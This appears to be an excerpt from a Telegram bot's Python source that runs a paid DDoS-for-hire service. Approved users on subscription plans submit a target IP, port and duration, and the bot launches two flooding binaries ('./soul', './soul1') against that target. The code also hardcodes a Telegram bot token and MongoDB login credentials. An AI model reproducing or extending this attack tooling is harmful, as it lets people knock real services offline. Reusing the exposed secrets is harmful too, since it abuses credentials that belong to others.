...
TOKEN = '7748107712:AAF7k3LI3YSfCjH7tyBQUoWsJ_rVEqKifiM'
MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
FORWARD_CHANNEL_ID = -1002151295220
CHANNEL_ID = -1002151295220
error_channel_id = -1002151295220
...
async def run_attack_command_async(target_ip, target_port, duration):
    # Launch both commands asynchronously
    command1 = f"./soul {target_ip} {target_port} {duration} 900"
    command2 = f"./soul1 {target_ip} {target_port} {duration} 900"
    process1 = asyncio.create_subprocess_shell(command1)
    process2 = asyncio.create_subprocess_shell(command2)
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"  # Access Denied message
                                       ...
                                       "*Contact the owner for assistance: @TANISHULTRA54.*", parse_mode='Markdown')
            return

        # Check plan limits
        if user_data['plan'] == 1 and users_collection.count_documents({"plan": 1}) > 99:
            bot.send_message(chat_id, "*🧡 Instant Plan is currently full!* \n"  # Instant Plan full message
                                       "*Please consider upgrading for priority access.*", parse_mode='Markdown')
            return

        if user_data['plan'] == 2 and users_collection.count_documents({"plan": 2}) > 499:
            bot.send_message(chat_id, "*💥 Instant++ Plan is currently full!* \n"  # Instant++ Plan full message
                                       "*Consider upgrading or try again later.*", parse_mode='Markdown')
            return
...
def process_attack_command(message):
    try:
        ...
        # Start both attack commands concurrently
...
def myinfo_command(message):
    ...
    if not user_data:
        ...
        response += "*For assistance, please contact the owner: @RAVENxKUNAL* "
    elif user_data.get('plan', 0) == 0:
        # User found but not approved
        response = "*🔒 Your account is still pending approval!* \n"
        response += "*Please reach out to the owner for assistance: @SOULCRACKS* 🙏"
    else:
